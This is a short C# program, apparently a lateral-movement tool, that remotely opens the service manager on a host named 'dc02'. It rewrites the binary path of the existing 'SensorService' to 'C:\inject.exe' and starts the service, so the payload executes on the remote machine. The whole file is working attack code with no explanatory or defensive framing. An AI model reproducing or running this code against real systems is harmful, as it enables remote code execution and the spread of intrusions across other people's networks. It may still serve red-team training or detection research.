﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Lat
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)] static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
        [DllImport("advapi32", SetLastError = true)]

        [return: MarshalAs(UnmanagedType.Bool)]

        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]

        [return: MarshalAs(UnmanagedType.Bool)]

        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
        static void Main(string[] args)
        {
            String target = "dc02";

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = "SensorService";

            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string payload = "C:\\inject.exe";

            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);
        }
    }
}
